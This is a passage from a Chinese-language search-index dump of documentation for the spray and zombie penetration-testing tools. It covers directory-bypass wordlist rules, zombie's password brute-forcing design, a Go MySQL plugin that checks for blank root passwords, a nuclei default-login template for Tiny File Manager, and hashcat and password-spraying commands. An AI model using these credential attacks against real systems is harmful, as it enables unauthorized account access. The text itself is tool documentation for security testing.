\u63d0\u4f9b\u4e86\u5728\u53d1\u73b0\u6709\u6548\u76ee\u5f55\u65f6\u7684\u8fdb\u4e00\u6b65\u57fa\u4e8e\u89c4\u5219\u7684\u5b57\u5178\u751f\u6210\u5668. \u5176\u4e2d\u89c4\u5219\u7684\u8bed\u6cd5\u4e0e\u5b57\u5178\u751f\u6210\u5668\u7684\u89c4\u5219\u7528\u6cd5\u4e00\u81f4</p> <p>\u5728 spray \u4e2d\u7684\u7528\u6cd5:</p> <ul> <li>\u81ea\u52a8\u751f\u6210\u6743\u9650\u7ed5\u8fc7\u5b57\u5178(\u4e3b\u8981\u5173\u4e8ejava). <code>--append-rule authbypass</code></li> <li>\u81ea\u52a8\u751f\u6210\u4f7f\u7528\u540e\u7f00\u8fdb\u884c\u6743\u9650\u7ed5\u8fc7\u7684\u5b57\u5178. <code>--append-rule extbypass</code></li> <li>\u6839\u636e\u6709\u6548 url \u81ea\u52a8\u751f\u6210\u5907\u4efd\u6587\u4ef6\u5b57\u5178. <code>--append-rule filebak</code></li> <li>\u66f4\u5bf9\u6b64\u7c7b\u89c4\u5219\u6b22\u8fce\u63d0\u4f9b\u9700\u6c42\u548c\u5efa\u8bae</li> </ul> <p>\u4f8b\u5982\u53d1\u73b0<code>index.php</code>\u5b58\u5728, \u5c31\u4f1a\u6839\u636e rule \u4e0e<code>baseurl</code> \u751f\u6210\u5982<code>~index.php</code>,<code>.index.php</code>, <code>index.php.bak</code>\u7b49\u5b57\u5178\u52a0\u5165\u5230\u961f\u5217\u4e2d.</p> <p>\u6548\u679c\u5982\u4e0b: </p> <p>common\u4e0ebak\u63d2\u4ef6\u5b9e\u9645\u4e0a\u4f7f\u7528\u4e86\u8f7b\u91cf\u7ea7\u9012\u5f52</p> <p>common\u4e0ebak\u5747\u4f1a\u4f7f\u7528\u5185\u7f6e\u7684\u5b57\u5178\u4e0e\u89c4\u5219\u8fdb\u884c\u8f7b\u91cf\u7ea7\u9012\u5f52</p>"},{"location":"spray/start/#todo","title":"TODO","text":"<ol> <li> \u6a21\u7cca\u5224\u65ad</li> <li> \u65ad\u70b9\u7eed\u4f20</li> <li> \u7b80\u6613\u722c\u866b</li> <li> \u652f\u6301 http2</li> <li> auto-tune, \u81ea\u52a8\u8c03\u6574\u5e76\u53d1\u6570\u91cf</li> <li> \u53ef\u81ea\u5b9a\u4e49\u7684\u9012\u5f52\u914d\u7f6e</li> <li> \u53c2\u8003fuzzuli, \u5b9e\u73b0\u5907\u4efd\u6587\u4ef6\u5b57\u5178\u751f\u6210\u5668</li> <li> \u652f\u6301 socks/http \u4ee3\u7406, \u4e0d\u5efa\u8bae\u4f7f\u7528, \u4f18\u5148\u7ea7\u8f83\u4f4e. \u4ee3\u7406\u4e0b\u7684 keep-alive \u4f1a\u6709\u4e25\u91cd\u7684\u6027\u80fd\u4e0b\u964d</li> <li> \u4e91\u51fd\u6570\u5316, chainreactors \u5de5\u5177\u94fe\u7684\u901a\u7528\u5206\u5e03\u5f0f\u89e3\u51b3\u65b9\u6848.</li> </ol>"},{"location":"zombie/","title":"zombie \u00b7 index","text":""},{"location":"zombie/#overview","title":"overview","text":"<p>repo: https://github.com/chainreactors/zombie</p> <p>\u4e0b\u8f7d:  https://github.com/chainreactors/zombie/releases/latest</p> <p>\u5feb\u901f\u5165\u95e8: https://chainreactors.github.io/wiki/zombie/start/</p> <p>zombie\u4e3b\u8981\u4e3a\u4e86\u89e3\u51b3\u9700\u8981\u5168\u573a\u666f(\u5916\u7f51\u3001\u5185\u7f51\u3001\u4e91)\u7684\u670d\u52a1\u7684\u53e3\u4ee4\u7206\u7834\u529f\u80fd, \u4f5c\u4e3agogo\u80fd\u529b\u7684\u8865\u5145. zombie\u63d0\u4f9b\u4e86\u7c7b\u4f3chashcat\u7684\u5b57\u5178\u751f\u6210\u5668, \u80fd\u9488\u5bf9\u4e0d\u540c\u573a\u666f\u4e0d\u540c\u76ee\u6807\u5b9a\u5236\u626b\u63cf\u7b56\u7565, \u5e76\u63d0\u4f9b\u4e86\u6bd4hydra\u66f4\u52a0\u4e30\u5bcc\u7684\u534f\u8bae\u652f\u6301\u4ee5\u53ca\u4e00\u5b9a\u7684\u540e\u5229\u7528\u80fd\u529b.</p> <p>Feature.</p> <ul> <li>\u8d85\u5f3a\u7684\u6027\u80fd, \u6570\u500d\u4e8ehydra</li> <li>\u4fbf\u643a\u4e14\u65e0\u4f9d\u8d56, \u80fd\u5728\u7edd\u5927\u591a\u6570\u573a\u666f\u843d\u5730</li> <li>\u4e30\u5bcc\u7684\u534f\u8bae\u652f\u6301</li> <li>\u4e0egogo\u7684\u5b8c\u7f8e\u8054\u52a8, \u4e00\u952e\u5bf9gogo\u626b\u63cf\u7ed3\u679c\u8fdb\u884c\u7206\u7834</li> <li>\u5b57\u5178\u751f\u6210\u5668, \u6839\u636e\u4e0d\u540c\u573a\u666f\u81ea\u52a8\u751f\u6210\u4e0d\u540c\u5b57\u5178</li> <li>\u591a\u79cd\u4fbf\u6377\u7684\u8f93\u5165\u4e0e\u8f93\u51fa\u65b9\u5f0f</li> </ul>"},{"location":"zombie/#\u76ee\u5f55","title":"\u76ee\u5f55","text":"<ol> <li>\u53c2\u6570\u4e0e\u529f\u80fd\u4ecb\u7ecd</li> <li>\u8bbe\u8ba1\u7406\u5ff5\u4e0e\u89e3\u51b3\u65b9\u6848</li> <li>\u62d3\u5c55</li> <li>\u6700\u4f73\u5b9e\u8df5</li> </ol>"},{"location":"zombie/design/","title":"zombie \u00b7 index","text":""},{"location":"zombie/design/#overview","title":"Overview","text":"<p>zombie\u662fgogo\u8bbe\u8ba1\u4e4b\u521d\u5c31\u8bde\u751f\u7684\u4e00\u4e2a\u8ba1\u5212, \u4e2d\u95f4\u5199\u4e86\u597d\u51e0\u7248(\u65e9\u671f\u7248\u672c@PassingFoam), \u6401\u7f6e\u4e86\u5feb\u4e00\u5e74. \u6b63\u5de7\u6709\u51e0\u4e2a\u670b\u53cb\u4e00\u76f4\u5728\u5173\u6ce8\u8fd9\u4e2a\u5de5\u5177, \u624d\u628a\u5b83\u4ece\u5185\u90e8\u4f7f\u7528\u7684\u5de5\u5177\u53d8\u6210\u57fa\u672c\u53ef\u7528\u7684\u5de5\u5177. \u867d\u7136\u62d6\u4e86\u4e00\u5e74\u591a, \u4f46\u5b83\u7edd\u5bf9\u662f\u5730\u7403\u4e0a\u6700\u5f3a\u5927\u7684\u7206\u7834\u5de5\u5177. </p>"},{"location":"zombie/design/#\u8bbe\u8ba1","title":"\u8bbe\u8ba1","text":""},{"location":"zombie/design/#\u5f00\u6e90\u4e16\u754c","title":"\u5f00\u6e90\u4e16\u754c","text":"<p>\u91cd\u65b0\u8bbe\u8ba1\u4e00\u5957\u5de5\u5177\u4e4b\u524d\u5f97\u5148\u5173\u6ce8\u8fd9\u4e2a\u9886\u57df\u7684\u524d\u8f88. </p> <ul> <li> <p>hydra \u6bcf\u4e2a\u4eba\u90fd\u7528\u8fc7\u7684\u7206\u7834\u5de5\u5177, \u547d\u4ee4\u884c\u7b80\u5355\u76f4\u767d. \u4f46\u4e5f\u4f1a\u53d1\u73b0, \u65e5\u7ad9\u8d8a\u719f\u7ec3\u5c31\u7528\u7684\u8d8a\u5c11, \u548c\u5b83\u7f16\u8bd1\u9ebb\u70e6, \u6027\u80fd\u8f83\u6162, \u6ca1\u529e\u6cd5\u8de8\u5e73\u53f0\u7b49\u7b49\u95ee\u9898\u76f8\u5173. \u4e0d\u8fc7\u9605\u8bfb\u5b83\u7684\u6e90\u7801\u4f1a\u53d1\u73b0, \u5b83\u5bf9\u6bcf\u4e2a\u534f\u8bae\u7684\u652f\u6301\u90fd\u662f\u539f\u751f\u7684, \u76f4\u63a5\u901a\u8fc7socket\u5b9e\u73b0, \u800c\u4e0d\u662f\u5f15\u5165\u7b2c\u4e09\u65b9\u5e93. </p> </li> <li> <p>medusa \u548chydra\u975e\u5e38\u76f8\u4f3c, \u6027\u80fd\u548c\u8bbe\u8ba1\u4e0a\u90fd\u5dee\u4e0d\u591a, \u7f3a\u70b9\u4e5f\u662f\u7c7b\u4f3c, \u7f16\u8bd1\u9ebb\u70e6, \u6027\u80fd\u8f83\u6162, \u6ca1\u529e\u6cd5\u8de8\u5e73\u53f0</p> </li> <li> <p>SNETCracker \"\u8d85\u7ea7\u5f31\u53e3\u4ee4\u68c0\u6d4b\u5de5\u5177\", \u6709\u4e00\u6bb5\u65f6\u95f4\u8001\u662f\u51fa\u73b0, \u751a\u81f3\u5728\u76ee\u6807\u7684\u5185\u7f51\u673a\u5668\u4e0a\u90fd\u627e\u5230\u8fc7\u53cb\u5546\u4e0a\u4f20\u7684\u8bb0\u5f55. \u5e26\u6709gui, \u4e0a\u624b\u5feb, \u4f46\u6027\u80fd\u5dee, \u590d\u6742\u573a\u666f\u65e0\u6cd5\u652f\u6301(\u4f8b\u5982\u7ed9\u975e\u9ed8\u8ba4\u53e3\u4ee4\u7684\u670d\u52a1\u7206\u7834\u90fd\u65e0\u6cd5\u505a\u5230). \u652f\u6301\u7684\u534f\u8bae\u4e5f\u4e0d\u662f\u5f88\u591a. </p> </li> <li> <p>legba \u4e00\u4e2arust\u7f16\u5199\u7684\u8f83\u65b0\u7684\u7206\u7834\u5de5\u5177, \u6211\u7b2c\u4e00\u773c\u770b\u5230\u5b83\u7684\u65f6\u5019\u4e00\u5ea6\u89c9\u5f97zombie\u9879\u76ee\u53ef\u4ee5\u505c\u6b62\u4e86. \u4f46\u5b9e\u9645\u4f7f\u7528\u4e86\u4e00\u6b21, \u53d1\u73b0hydra\u6709\u7684\u95ee\u9898\u5b83\u7adf\u7136\u5b8c\u7f8e\u7684\u4fdd\u7559\u4e86, \u9664\u4e86rust\u7684tokio\u63d0\u4f9b\u4e86\u66f4\u5f3a\u5927\u7684\u591a\u7ebf\u7a0b\u6027\u80fd\u5916, \u4f9d\u65e7\u662f\u65e0\u6cd5\u8de8\u5e73\u53f0, \u7f16\u8bd1\u9ebb\u70e6\u4e4b\u7c7b\u7684\u95ee\u9898, \u652f\u6301\u7684\u534f\u8bae\u4e5f\u6ca1\u90a3\u4e48\u591a. \u53cd\u800c\u8ba9\u6211\u66f4\u8feb\u5207\u7684\u5b8c\u6210zombie\u9879\u76ee</p> </li> <li> <p>\u5176\u4ed6, \u8fd9\u4e24\u5e74\u4e5f\u51fa\u73b0\u4e86fscan, kscan\u7b49\u7b49\u5e26\u6709\u7206\u7834\u529f\u80fd\u7684\u626b\u63cf\u5668, \u4f46\u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u4eba\u53d1\u73b0, \u4f7f\u7528fscan\u7684\u65f6\u5019\u4ece\u6765\u6ca1\u626b\u63cf\u5230\u8fc7\u975e\u9ed8\u8ba4\u7aef\u53e3\u7684\u5f31\u53e3\u4ee4(\ud83d\ude0a), \u56e0\u4e3afscan\u786c\u7f16\u7801\u4e86\u7aef\u53e3\u53f7, \u5e76\u6839\u636e\u7aef\u53e3\u53f7\u8fdb\u884c\u7206\u7834. \u8bf8\u5982\u6b64\u7c7b\u95ee\u9898, \u4ed6\u4eec\u7684\u7206\u7834\u80fd\u529b\u5bf9\u6bd4hydra\u6765\u8bf4\u53cd\u800c\u662f\u9000\u6b65\u4e86. </p> </li> </ul>"},{"location":"zombie/design/#\u8bbe\u8ba1_1","title":"\u8bbe\u8ba1","text":"<p>zombie\u7684\u8bbe\u8ba1\u4e4b\u521d\u6709\u51e0\u4e2a\u76ee\u6807:</p> <ol> <li>\u8054\u52a8gogo. gogo\u4e3a\u4e86\u8f7b\u91cf, \u65e0\u4f9d\u8d56\u653e\u5f03\u4e86\u5f88\u591a\u529f\u80fd. \u4f46\u670d\u52a1\u7206\u7834\u8fd9\u4e2a\u529f\u80fd\u53c8\u4e0d\u5fc5\u53ef\u5c11.</li> <li>\u7b80\u6d01\u5e76\u5f3a\u5927\u7684\u547d\u4ee4\u884c\u8bbe\u8ba1. (\u53c2\u8003\u4e86hydra\u7684\u547d\u4ee4\u884c\u8bbe\u8ba1)</li> <li>\u652f\u6301\u8db3\u591f\u591a\u7684\u670d\u52a1, \u5305\u62ec\u5404\u79cdweb\u670d\u52a1, \u76ee\u524d\u4f9d\u65e7\u652f\u6301\u4e86\u6570\u5341\u4e2a\u670d\u52a1. (\u901a\u8fc7\u539f\u751f\u63d2\u4ef6\u4e0eneutron\u5f15\u64ce\u5b9e\u73b0\u4e86)</li> <li>\u652f\u6301\u52a8\u6001\u751f\u6210\u5b57\u5178 (\u91cd\u5199\u4e86hashcat\u7684rule\u4e0emask\u751f\u6210\u5668)</li> <li>\u652f\u6301\u4e00\u5b9a\u7684\u540e\u6e17\u900f\u80fd\u529b (\u7c7b\u4f3ccrackmapexec, \u76ee\u524d\u8fd8\u672a\u5b9e\u73b0)</li> </ol>"},{"location":"zombie/design/#\u5b57\u5178\u751f\u6210\u5668","title":"\u5b57\u5178\u751f\u6210\u5668","text":"<p>\u591a\u5e74\u7684\u7ecf\u9a8c\u544a\u8bc9\u6211, \u4e00\u4e2a\u597d\u7684\u5b57\u5178\u80fd\u89e3\u51b390%\u7684\u76ee\u6807, \u5269\u4e0b\u768410%\u53ea\u662f\u56e0\u4e3a\u5b57\u5178\u8fd8\u4e0d\u591f\u597d. </p> <p>\u5728\u7edd\u5927\u591a\u6570\u60c5\u51b5\u4e0b,  \u627e\u5230\u4e00\u4e2a\u53e3\u4ee4, \u5c31\u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u53e3\u4ee4\u7684\u89c4\u5f8b\u751f\u6210\u51fa\u80fd\u901a\u6740\u5927\u90e8\u5206\u670d\u52a1\u7684\u53e3\u4ee4.  \u56e0\u6b64, \u5b57\u5178\u751f\u6210\u5668\u7684\u8bbe\u8ba1\u662fzombie\u7684\u6838\u5fc3. </p> <p>\u800c\u76ee\u524d\u4f7f\u7528\u6700\u591a\u7684\u5b57\u5178\u751f\u6210\u5668\u8fd8\u662fhashcat. \u4e5f\u6709\u5404\u7c7b\u793e\u5de5\u5b57\u5178\u751f\u6210\u5668, \u4e0d\u8fc7\u539f\u7406\u5927\u540c\u5c0f\u5f02. \u63d0\u4f9b\u8db3\u591f\u591a\u7684\u4fe1\u606f, \u7136\u540e\u505a\u7b1b\u5361\u5c14\u79ef. \u5b9e\u9645\u4e0a\u7684\u80fd\u529b\u53cd\u800c\u4e0d\u5982hashcat\u7684rule-base . </p> <p>\u5f88\u591a\u4eba\u53ef\u80fd\u4e0d\u77e5\u9053, hashcat\u5185\u7f6e\u4e86\u4e00\u4e2a\u975e\u5e38\u597d\u7528\u7684\u89c4\u5219\u5e93. rockyou-30000. \u5b83\u662f\u6839\u636erockyou\u6cc4\u9732\u7684\u5bc6\u7801\u751f\u6210\u768430000\u6761\u6700\u5e38\u7528\u7684rule. \u4e5f\u5c31\u662f\u8bf4, \u5047\u8bbe\u8f93\u5165<code>admin</code>, \u5b83\u4f1a\u751f\u621030000\u6761\u4e0eadmin\u76f8\u5173\u7684\u5b57\u5178. </p> <p><code>hashcat --stdout -r /usr/share/hashcat/rules/rockyou-30000.rule word.txt &gt;wordlist.txt</code></p> <p>\u8fd9\u4e2a\u89c4\u5219\u5e93\u4e0d\u6b62\u4e00\u6b21\u7ed9\u6211\u5e26\u6765\u60ca\u559c.  \u76f8\u4fe1\u4f60\u4e5f\u503c\u5f97\u6709\u7528. (\u8fd9\u4e2a\u89c4\u5219\u5e93\u5df2\u7ecf\u5728zombie\u4e2d\u5b9e\u73b0, \u89c1: https://chainreactors.github.io/wiki/zombie/start/#_2)</p> <p>\u800c\u95ee\u9898\u5728\u4e8ehashcat\u7684rulebase\u7adf\u7136\u6ca1\u6709\u5176\u4ed6\u8bed\u8a00\u7684\u5b9e\u73b0, \u4e8e\u662f\u6211\u624b\u6413\u4e86\u4e00\u4e2a\u7b80\u5355\u7684dsl---words, \u5b9e\u73b0\u4e86hashcat\u7684rule\u4e0emask\u7684\u5927\u90e8\u5206\u529f\u80fd. </p> <p>hashcat\u56e0\u4e3a\u592a\u8fc7\u4e8e\u53e4\u8001, \u751a\u81f3\u4e0d\u652f\u6301\u8d85\u8fc710\u4f4d\u7684\u5b57\u5178, \u4ee5\u53ca\u4e00\u7cfb\u5217\u7c7b\u4f3c\u7684\u5c0f\u95ee\u9898, \u4e5f\u5728words\u4e2d\u5f97\u5230\u4e86\u89e3\u51b3. \u6211\u4e5f\u5c06\u4e3awords\u63d0\u4f9b\u6587\u6863, \u6b22\u8fce\u66f4\u591a\u7684\u4f7f\u7528\u8005. </p> <p>\u8fd9\u4e2a\u5b57\u5178\u751f\u6210\u5668\u4e5f\u5728spray(\u4e00\u4e2a\u5f3a\u5927\u7684\u76ee\u5f55\u7206\u7834/\u6307\u7eb9\u8bc6\u522b\u5de5\u5177) \u5f97\u5230\u4e86\u5e94\u7528, \u7528\u6765\u751f\u6210\u76ee\u5f55\u5b57\u5178.</p>"},{"location":"zombie/design/#\u547d\u4ee4\u884c\u8bbe\u8ba1","title":"\u547d\u4ee4\u884c\u8bbe\u8ba1","text":"<p>hydra\u7ed9\u7528\u6237\u7684\u4f7f\u7528\u4f53\u9a8c\u662f\u5b83\u7684\u6587\u6863\u53ea\u9700\u8981\u9605\u8bfb\u4e00\u6b21, \u4e0a\u624b\u975e\u5e38\u5feb. zombie\u4e5f\u5728\u5c3d\u529b\u505a\u5230\u8fd9\u4e00\u70b9(gogo\u4e0espray\u5728\u8fd9\u4e00\u70b9\u4e0a\u5f88\u5931\u8d25\ud83d\ude0a).</p> <p>\u5c0f\u5199\u7684<code>-i</code>\u662f\u5355\u4e2a\u76ee\u6807, \u5927\u5199\u7684<code>-I</code>\u662f\u6587\u4ef6\u8f93\u5165, \u5c0f\u5199\u7684<code>-u</code> \u662f\u5355\u4e2a\u7528\u6237\u540d, \u5927\u5199\u7684<code>-U</code> \u662f\u7528\u6237\u540d\u6587\u4ef6, \u4ee5\u6b64\u7c7b\u63a8. \u5728zombie\u4e2d, \u8fd9\u4e00\u70b9\u662f\u5b8c\u5168\u4e00\u81f4\u7684.  </p> <p>zombie\u6709\u66f4\u591a\u7684\u529f\u80fd, \u4e0d\u5f97\u4e0d\u52a0\u5165\u4e86\u66f4\u591a\u53c2\u6570, \u4e0d\u8fc7\u6700\u57fa\u672c\u4f7f\u7528\u4e0a\u4e0ehydra\u975e\u5e38\u76f8\u4f3c, \u4e0d\u9700\u8981\u4ed8\u51fa\u989d\u5916\u7684\u5b66\u4e60\u6210\u672c. \u4f46\u8981\u4f7f\u7528\u66f4\u591a\u66f4\u5f3a\u5927\u7684\u529f\u80fd, \u8fd8\u662f\u5efa\u8bae\u5b8c\u6574\u9605\u8bfb\u6587\u6863, \u5b66\u4e60\u66f4\u591a\u590d\u6742\u7684\u9ad8\u7ea7\u7528\u6cd5. </p>"},{"location":"zombie/design/#\u8054\u52a8","title":"\u8054\u52a8","text":"<p>zombie\u6700\u521d\u8bbe\u8ba1\u4e0a\u662f\u4e3a\u4e86\u8865\u5145gogo\u7684\u80fd\u529b, \u56e0\u4e3agogo\u4e3a\u4e86\u8ffd\u6c42\u5168\u573a\u666f\u53ef\u7528\u88ab\u8feb\u653e\u5f03\u4e86\u5f88\u591a\u529f\u80fd. zombie\u4e0d\u4ec5\u4e0d\u5168\u4e86gogo\u6ca1\u6709\u7684\u7206\u7834\u80fd\u529b, \u8fd8\u5b9e\u73b0\u4e86\u66f4\u591a\u7684\u529f\u80fd. </p> <p>\u5047\u8bbe\u4e00\u4e2a\u573a\u666f, \u62ff\u5230\u4e86\u4e00\u4e2a\u8d26\u53f7\u5bc6\u7801, \u5982\u4f55\u5224\u65ad\u5b83\u662f\u901a\u7528\u7684? </p> <p>\u5728zombie\u4e2d\u5f88\u7b80\u5355, <code>zombie --gogo 1.dat -u [username] -p [password]</code> , zombie\u5c06\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u5bc6\u7801\u5bf9\u6240\u6709\u652f\u6301\u7684\u63d2\u4ef6\u8fdb\u884c\u4e00\u8f6e\u78b0\u649e. \u6bd4\u8d77\u5176\u4ed6\u5de5\u5177\u4e2d\u7684\u6bcf\u4e2a\u670d\u52a1\u90fd\u9700\u8981\u64cd\u4f5c\u4e00\u6b21\u65b9\u4fbf\u4e86\u4e0d\u77e5\u9053\u591a\u5c11\u500d.  </p> <p>\u540c\u6837\u7684, \u8981\u5b9e\u73b0\u7c7b\u4f3cfscan\u90a3\u6837\u7684\u6700\u5927\u53ef\u80fd\u7206\u7834, zombie\u4e2d\u4e5f\u5f88\u7b80\u5355, <code>zombie --gogo 1.dat</code></p> <p>zombie\u5185\u7f6e\u4e86\u5c06gogo\u6587\u4ef6\u89e3\u6790\u4e3a\u4e00\u4e2azombie\u53ef\u8bc6\u522b\u7684json\u914d\u7f6e, \u4e5f\u53ef\u4f7f\u7528\u5176\u4ed6\u5de5\u5177\u5bfc\u51fa\u4e00\u4e2a\u8fd9\u6837\u7ed3\u6784\u7684json\u6587\u4ef6\uff0c \u540c\u6837\u80fd\u8c03\u7528zombie\u8fdb\u884c\u6279\u91cf\u7206\u7834.</p> <pre><code>[\n    {\n        \"ip\": \"123.123.123.123\",\n        \"port\": \"443\",\n        \"service\": \"gitlab\",\n        \"scheme\": \"https\"\n    }\n]\n</code></pre>"},{"location":"zombie/design/#\u62d3\u5c55\u6027","title":"\u62d3\u5c55\u6027","text":"<p>\u63d2\u4ef6\u7cfb\u7edf\u8bbe\u8ba1\u7684\u5e76\u6ca1\u6709gogo\u90a3\u4e48\u590d\u6742, web\u670d\u52a1\u7684\u590d\u7528\u4e86gogo\u539f\u672c\u7684\u63d2\u4ef6\u4ed3\u5e93, \u975eweb\u670d\u52a1\u5219\u4f7f\u7528\u4e86go\u7f16\u5199\u7684\u539f\u751f\u63d2\u4ef6\u5b9e\u73b0.</p> <p>\u9664\u4e86\u63d2\u4ef6\u4e4b\u5916, \u8fd8\u6709\u4e00\u4e2a\u5185\u7f6e\u7684\u89c4\u5219\u5e93, \u7528\u6765\u751f\u6210\u5b57\u5178\u4ee5\u53ca\u9ed8\u8ba4\u5bc6\u7801\u7684\u914d\u7f6e. \u4f4d\u4e8e: https://github.com/chainreactors/templates/tree/master/zombie , \u5982\u679c\u6709\u9057\u6f0f\u6b22\u8fce\u63d0\u4f9b\u5efa\u8bae.</p>"},{"location":"zombie/design/#\u672a\u6765","title":"\u672a\u6765","text":"<p>zombie\u63a5\u4e0b\u6765\u7684\u5de5\u4f5c\u91cd\u5fc3\u5c06\u662f\u7ec6\u8282\u4e0a\u7684\u4f18\u5316, \u6709\u8bb8\u591a\u534f\u8bae\u5b9e\u73b0\u7684\u633a\u7c97\u7cd9\u7684, \u4e5f\u8fd8\u672a\u8fdb\u884c\u5145\u5206\u6d4b\u8bd5,  panic\u662f\u5bb6\u5e38\u4fbf\u996d(\u66f4\u65b0\u901f\u5ea6\u592a\u5feb, \u6d4b\u8bd5\u8986\u76d6\u4e0d\u5168), \u5e76\u4ecenuclei\u4e2d\u79fb\u690d\u6240\u6709\u8f83\u9ad8\u4ef7\u503c\u7684login\u76f8\u5173\u7684template. </p> <p>\u4e2d\u957f\u671f\u89c4\u5212\u662f\u5b9e\u73b0\u57fa\u672c\u7684\u4fe1\u606f\u63d0\u53d6\u548c\u540e\u6e17\u900f\u529f\u80fd, \u76ee\u524d\u6765\u770b\u4f18\u5148\u7ea7\u5e76\u4e0d\u9ad8. </p>"},{"location":"zombie/extension/","title":"zombie \u00b7 \u62d3\u5c55","text":"<p>zombie\u7684\u62d3\u5c55\u5206\u4e3a\u4e24\u79cd</p> <ol> <li>\u901a\u8fc7go\u7f16\u5199\u7684\u539f\u751f\u63d2\u4ef6, \u53ef\u4ee5\u8c03\u7528\u7b2c\u4e09\u65b9\u5e93, \u5904\u7406\u4e00\u4e9b\u8f83\u4e3a\u590d\u6742\u7684\u8ba4\u8bc1\u903b\u8f91. \u4f8b\u5982\u5404\u79cd\u6570\u636e\u5e93, telnet\u7b49\u8f83\u4e3a\u590d\u6742\u7684\u6a21\u5757. </li> <li>\u901a\u8fc7neutron tamplate\u652f\u6301\u7684\u6a21\u5757, \u7528\u6765\u5904\u7406\u4f7f\u7528http\u534f\u8bae\u8ba4\u8bc1\u7684\u670d\u52a1\u6216\u8f83\u4e3a\u7b80\u5355\u7684socket\u901a\u8baf\u534f\u8bae</li> </ol>"},{"location":"zombie/extension/#go\u539f\u751f\u63d2\u4ef6","title":"go\u539f\u751f\u63d2\u4ef6","text":"<p>\u9700\u8981\u5b9e\u73b0\u4ee5\u4e0b\u63a5\u53e3.</p> <pre><code>type Plugin interface {  \n   Name() string  \n   Unauth() (bool, error)  \n   Login() error  \n   Close() error  \n   GetResult() *pkg.Result  \n}\n</code></pre> <p>\u8fd9\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u793a\u4f8b:</p> mysql\u672a\u6388\u6743\u63a2\u6d4b\u4e0e\u7206\u7834 <pre><code>type MysqlPlugin struct {\n    *pkg.Task\n    input string\n    conn  *sql.DB\n}\n\nfunc (s *MysqlPlugin) Name() string {\n    return s.Service\n}\n\nfunc (s *MysqlPlugin) Unauth() (bool, error) {\n    // mysql none pass\n    mysql.SetLogger(nilLog{})\n    dataSourceName := fmt.Sprintf(\"%v:%v@tcp(%v:%v)/?timeout=%ds&amp;readTimeout=%ds&amp;writeTimeout=%ds&amp;charset=utf8\", \"root\",\n        \"\", s.IP, s.Port, s.Timeout, s.Timeout, s.Timeout)\n    conn, err := sql.Open(\"mysql\", dataSourceName)\n    if err != nil {\n        return false, err\n    }\n\n    err = conn.Ping()\n    if err != nil {\n        return false, err\n    }\n    s.conn = conn\n    return true, nil\n}\n\nfunc (s *MysqlPlugin) Login() error {\n    mysql.SetLogger(nilLog{})\n    dataSourceName := fmt.Sprintf(\"%v:%v@tcp(%v:%v)/?timeout=%ds&amp;readTimeout=%ds&amp;writeTimeout=%ds&amp;charset=utf8\", s.Username,\n        s.Password, s.IP, s.Port, s.Timeout, s.Timeout, s.Timeout)\n    conn, err := sql.Open(\"mysql\", dataSourceName)\n    if err != nil {\n        return err\n    }\n\n    err = conn.Ping()\n    if err != nil {\n        return err\n    }\n    s.conn = conn\n    return nil\n}\n\nfunc (s *MysqlPlugin) GetResult() *pkg.Result {\n    return &amp;pkg.Result{Task: s.Task, OK: true}\n}\n\nfunc (s *MysqlPlugin) Close() error {\n    if s.conn != nil {\n        return s.conn.Close()\n    }\n    return pkg.NilConnError{s.Service}\n}\n</code></pre> <p>\u8fd9\u4e2a\u63d2\u4ef6\u5b9e\u73b0\u4e86mysql\u7684\u672a\u6388\u6743\u63a2\u6d4b\u4e0e\u901a\u8fc7\u81ea\u5b9a\u4e49\u7684\u8d26\u53f7\u5bc6\u7801\u7206\u7834. </p>"},{"location":"zombie/extension/#template\u52a8\u6001\u52a0\u8f7d\u7684\u63d2\u4ef6","title":"template\u52a8\u6001\u52a0\u8f7d\u7684\u63d2\u4ef6","text":"<p>zombie\u4f7f\u7528\u4e86\u4e0egogo\u76f8\u540c\u7684template\u5f15\u64ce neutron, \u5e76\u590d\u7528\u4e86gogo\u7684template\u4ed3\u5e93\u4e2d\u7684login\u90e8\u5206. </p> <p>\u53ea\u9700\u8981\u5bf9\u539f\u7248\u7684nucleipoc\u8fdb\u884c\u7b80\u5355\u7684\u4fee\u6539, \u5373\u53ef\u79fb\u690d\u7ed9gogo\u4e0ezombie\u4f7f\u7528.</p>"},{"location":"zombie/extension/#\u4ecenuclei\u4ed3\u5e93\u4e2d\u79fb\u690dtemplate\u5230neutron","title":"\u4ecenuclei\u4ed3\u5e93\u4e2d\u79fb\u690dtemplate\u5230neutron","text":"<p>step1 \u6311\u9009\u4e0e\u526a\u679d</p> <p>\u514b\u9686 https://github.com/chainreactors/templates \u5230\u672c\u5730, \u64cd\u4f5c\u66f4\u65b9\u4fbf</p> <p>\u6311\u9009\u5408\u9002\u7684template, \u4f8b\u5982tiny-file-manager-default-login</p> <pre><code>id: tiny-filemanager-default-login\n\ninfo:\n  name: Tiny File Manager - Default Login\n  author: shelled\n  severity: high\n  description: Tiny File Manager contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.\n  reference:\n    - https://github.com/prasathmani/tinyfilemanager\n    - https://tinyfilemanager.github.io/docs/\n  classification:\n    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L\n    cvss-score: 8.3\n    cwe-id: CWE-522\n  metadata:\n    verified: true\n    max-request: 3\n    shodan-query: html:\"Tiny File Manager\"\n  tags: default-login,tiny,filemanager\n\nhttp:\n  - raw:\n      - |\n        GET / HTTP/1.1\n        Host: {{Hostname}}\n      - |\n        POST / HTTP/1.1\n        Host: {{Hostname}}\n        Content-Type: application/x-www-form-urlencoded\n\n        fm_usr={{user}}&amp;fm_pwd={{pass}}&amp;token={{token}}\n      - |\n        GET /?p= HTTP/1.1\n        Host: {{Hostname}}\n\n    attack: pitchfork\n    payloads:\n      user:\n        - admin\n      pass:\n        - admin@123\n    skip-variables-check: true\n    host-redirects: true\n    max-redirects: 2\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        words:\n          - 'admin'\n          - 'You are logged in'\n          - 'Tiny File Manager'\n        condition: and\n\n      - type: status\n        status:\n          - 200\n\n    extractors:\n      - type: regex\n        name: token\n        part: body\n        regex:\n          - '([a-f0-9]{64})'\n        internal: true\n</code></pre> <p>\u5220\u9664\u6389neutron\u4e2d\u65e0\u7528\u7684\u90e8\u5206(\u5176\u5b9e\u5ffd\u7565\u8fd9\u4e00\u6b65\u4e5f\u6ca1\u95ee\u9898, 